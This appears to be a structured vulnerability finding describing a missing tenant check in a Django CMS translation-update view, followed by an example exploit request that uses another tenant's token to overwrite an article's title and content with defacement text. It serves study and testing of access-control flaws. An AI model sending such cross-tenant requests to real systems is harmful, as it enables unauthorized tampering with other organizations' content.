diagnosis: ArticleTranslationUpdateView allows updating localized text for CMS articles by operating directly on the underlying django-parler ArticleTranslation model. The view fetches ArticleTranslation by translation_id but does not check whether trans.master.organization matches request.user.organization. Any authenticated user can modify translations of published or internal articles owned by other organizations.
exploit_request:
PUT /api/translations/articles/291/ HTTP/1.1
Host: cms.multilingual-corp.net
Authorization: Bearer tenant_2_translator
Content-Type: application/json

{
  "title": "Defaced Announcement Headline",
  "content": "Tampered corporate content."
}
